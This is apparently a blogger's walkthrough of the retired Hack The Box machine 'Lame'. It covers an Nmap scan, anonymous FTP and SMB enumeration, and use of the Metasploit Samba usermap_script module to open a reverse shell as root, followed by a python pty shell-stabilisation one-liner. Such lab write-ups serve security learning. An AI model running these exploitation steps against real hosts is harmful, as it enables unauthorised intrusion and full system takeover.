# Lame

Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement. 

The first thing to do with an IP address is to run an Nmap scan.
```
nmap -sC -Pn -A 10.10.10.3
```
```
Nmap scan report for 10.10.10.3
Host is up (0.28s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.41
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h00m24s, deviation: 2h49m45s, median: 21s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-06-20T02:22:36-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.15 seconds
```
FTP, SSH, and Samba smdb are running on the machines.
I can connect to the FTP service using
```
ftp ftp://anonymous@10.10.10.3
```
Connecting with 'anonymous' doesn't require a password.
```
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp>
```
But I found nothing in there.
SSH will require a username and password or a public key to log in, but I don't have any.

Then comes the Samba service. 

Using `smbclient` to list the available shares on the target
```
─$ smbclient -L 10.10.10.3   
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME

```
I was able to connect to the tmp share, but nothing there.
Going through the Nmap scan, I see the Samba version (Samba 3.0.20-Debian).
I will use Metasploit to check if any exploit is available for this version

```
msf6 > search Samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
```
Using `exploit/multi/samba/usermap_script` to exploit the service running.
Setting the LHOST and RHOST with my machine IP and target IP, respectively, and running the exploit.

```
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.16.41:4444 
[*] Command shell session 1 opened (10.10.16.41:4444 -> 10.10.10.3:59749) at 2024-06-20 02:35:46 -0400

whoami
root
which python
/usr/bin/python
```
But the shell is not stabilised. I will stabilise the shell with 
`python -c 'import pty;pty.spawn("/bin/bash")'`

`root@lame:/#`

Shell stabilisation is explained nicely here: https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal

Now that I have the shell access, I can find the flags using the `find` command.
